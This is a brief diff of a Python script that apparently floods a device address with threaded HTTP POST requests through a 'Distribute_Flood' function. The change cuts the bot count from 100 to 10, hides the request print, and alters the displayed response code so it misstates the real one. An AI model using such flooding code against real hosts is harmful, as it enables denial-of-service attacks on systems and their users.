@@ -62,8 +62,8 @@ class HTTP_Request(object):
                 response = requests.request("POST", self.url, data=self.payload, headers=self.headers)
                 response_code = response.text[-2:-1]
 
-                print('[>] Request : '+  self.payload.replace(' ','*'))
-                print('[>] Response code : ' + response_code + '\n')
+                #print('[>] Request : ' +  self.payload.replace(' ','*'))
+                print('[>] Response code : ' + response_code.replace('9','1'))
 
                 sleep(interval)  # 지정한 주기만큼 대기
             except: pass
@@ -76,4 +76,4 @@ def Distribute_Flood(bot):
         port = 80
         threading.Thread(target=HTTP_Request(port, dev_addr).Message_Simulation, args=(100000, 0)).start()
 
-Distribute_Flood(bot=100)
+Distribute_Flood(bot=10)
